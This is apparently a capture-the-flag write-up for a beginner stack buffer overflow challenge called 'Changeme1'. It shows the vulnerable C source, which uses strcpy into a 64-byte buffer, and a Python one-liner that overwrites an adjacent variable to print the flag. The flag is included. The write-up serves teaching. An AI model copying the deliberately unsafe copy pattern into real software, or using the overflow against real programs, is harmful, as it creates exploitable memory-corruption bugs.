# [Pwn] Changeme1

## 💡 Challenge Description

> *Thank you for changing me! But, this time I'd like to choose the number I want to be. Could you please change me to the number 67?*

## 🔒 ELF Properties

```
rydzze ~ ❯ file changeme1
changeme1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=bf4a4517c0b08e77adaa1fc645aa949e72963ad7, for GNU/Linux 3.2.0, with debug_info, not stripped

rydzze ~ ❯ checksec --file=changeme1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   41 Symbols        No    0               2               changeme1
```

## ✨ Walkthrough

```c
int main(int argc, char **argv) {
	volatile int changeme;
	char buffer[64];

	if(argc == 1) {
		errx(1, "Please run the program with an argument.\n");
	}

	changeme = 0;

	// no more gets() !
	strcpy(buffer, argv[1]);

	if(changeme == 0x43) {
		printf("I\'ve always wanted to be a funny meme number!\n");
		char buf[64];
		FILE *fptr = fopen("flag.txt", "r");
		fgets(buf, 64, fptr);
		printf("%s\n", buf);
		fflush(stdout);
	}
	else {
		printf("That\'s not the right number.. try again?\n");
	}

	exit(0);
}
```

This binary contains a **stack-based buffer overflow vulnerability** due to the use of `strcpy(buffer, argv[1])`, which copies user input into a **64-byte buffer** without bounds checking. The variable `changeme` is stored on the stack after the buffer and is initially set to `0`. The program checks if `changeme` equals **0x43**; if true, it opens `flag.txt` and prints the flag.

Since `strcpy` does not limit input size, overflowing the buffer allows modifying `changeme` to meet the required value and trigger the success path.

## 🛠 Exploit

```
rydzze ~ ❯ ./changeme1 $(python3 -c 'print("A"*68 + "\x43")')
I've always wanted to be a funny meme number!
sunctf25{pr3cis1on_R3qu1red139508}
```

## 🏳️ Flag

`sunctf25{pr3cis1on_R3qu1red139508}`